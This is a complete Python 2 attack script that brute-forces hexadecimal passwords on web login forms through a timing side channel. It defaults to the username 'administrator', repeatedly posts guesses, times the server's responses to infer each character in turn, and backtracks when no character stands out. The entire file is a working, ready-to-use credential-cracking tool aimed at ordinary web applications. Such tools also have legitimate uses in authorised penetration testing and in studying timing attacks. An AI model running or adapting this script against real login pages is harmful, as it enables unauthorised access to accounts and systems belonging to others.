#!/usr/bin/env python

"""
Bruteforces passwords by using a timing attack on webforms.
Based on the notion that successful password (characters) are expected to take
longer(!) to process than unsuccessful passwords.
Currently only hexadecimal 'passwords' are supported - adapt to your needs...

"""

import argparse
import requests
import sys
import textwrap
import urlparse
from datetime import timedelta


__author__ = "Peter Mosmans"
__copyright__ = "Copyright 2015, Go Forward"
__license__ = "GPL"
__version__ = "0.0.1"
__maintainer__ = "Peter Mosmans"
__contact__ = "support@go-forward.net"
__status__ = "Development"


def parse_arguments():
    """
Parses command line arguments and returns the URL
"""
    global delay
    global length
    global url
    global username
    global repeat
    global verboseprint
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=textwrap.dedent('''\
Bruteforces passwords by using a timing attack on webforms.
Based on the notion that successful password (characters) are expected to take
longer(!) to process than unsuccessful passwords.
Currently only hexadecimal 'passwords' are supported - adapt to your needs...

Copyright (C) 2015 Peter Mosmans [Go Forward]
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.'''))
    parser.add_argument('url', action='store',
                        help='the URL of the webform')
    parser.add_argument('--delay', action='store', type=int, default=300,
                        help='the expected delay in milliseconds')
    parser.add_argument('--length', action='store', type=int, default=32,
                        help='the maximum length of the password')
    parser.add_argument('--repeat', action='store', type=int, default=3,
                        help='the number of tries per character')
    parser.add_argument('-u', '--username', default='administrator',
                        action='store', help='the username')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='increase output verbosity')
    args = parser.parse_args()
    if args.verbose:
        def verboseprint(*args):
            print '# ',
            for arg in args:
                print arg,
                print
    else:
        verboseprint = lambda *a: None
    delay = timedelta(milliseconds=args.delay)
    length = args.length
    repeat = args.repeat
    url = args.url
    username = args.username
    if not urlparse.urlparse(url).scheme:
        url = 'http://{0}'.format(url)


def post_form(url, password='unlikelytobeacorrectpassword'):
    post_data = {'username': username, 'password': password}
    try:
        return requests.post(url, data=post_data)
    except:
        print '-- could not connect to {0}, exiting'.format(url)
        sys.exit()


def baseline(url):
    checksum  = post_form(url)
    result = post_form(url, 'anothertry')
    if (result.status_code != checksum.status_code):
        print '-- different HTTP response ({0} and {1}) for different passwords, exiting'.format(result.status_code,
                                                                                     checksum.status_code)
        sys.exit()
    if (len(result.content) != len(checksum.content)):
        verboseprint('different response size ({0} and {1}) for different passwords'.            format(len(result.content), len(checksum.content)))
    verboseprint('baselining: received statuscode {0} and response size {1} in {2} microseconds'.format(result.status_code, len(result.content), result.elapsed.microseconds))
    return result


def time_results(url, password, baseline_response):
    result = post_form(url, password)
    if result.status_code != baseline_response.status_code:
        print 'Bingo ? Deceived status code {0} when trying {1}'.format(result.status_code, password)
        print result.content
        sys.exit()
    if (len(result.content) != len(baseline_response.content)):
        print 'Bingo ? Different content sizeresult {0} when trying {1}'.format(result.status_code, password)
        print result.content
        sys.exit()
    return result.elapsed


def main():
    global baseline_response
    global delay
    global length
    global repeat
    global url
    global username
    parse_arguments()
    pos = 0
    password = ['0'] * length
    baseline_response  = baseline(url)
    longest = baseline_response.elapsed
    print 'bruteforcing {0} with max password length of {1} using username {2}'.format(url, length, username)
    print '== using {0} microseconds as baseline latency, repeating maximum of {1} tries per position'.format(longest.microseconds, repeat)
    verboseprint('starting with {0}'.format(''.join(password)))
    print '== bruteforcing {0:2d} positions starting with position {1}'.format(length, pos)
    repeated = 1
    expected_delay = delay
    while ((pos  <  length) and (pos >= 0)):
        sys.stdout.flush()
        possible_match = ''
        for i in range (0,16):
            character = hex(i)[2:]
            password[pos] = character
            password_string = ''.join(password)
            time_taken = time_results(url, password_string, baseline_response)
            if (time_taken >= (longest + expected_delay)):
                longest = time_taken
                possible_match = character
                delta = longest - time_taken
                print '++ position {0:2d} could be {1} as it took {2} longer for try {3}'.format(pos, character, delta.microseconds, password_string[:(pos + 1)])
                break

        if (possible_match != ''):
            expected_delay = delay
            password[pos] = possible_match
            pos += 1
            repeated = 0
        else:
            if (repeated < repeat):
                expected_delay = delay - timedelta(milliseconds=15)
                repeated += 1
                print '-- did not find a match on position {0:2d}, adjusting expected delay...  {1}'.format(pos, ''.join(password)[:pos])
            else:
                password[pos] = '0'
                print 'backtracking...'.format(pos)
                pos -= 1


    print 'Ended unsuccessfully with {0}'.format(''.join(password))


if __name__ == "__main__":
    main()
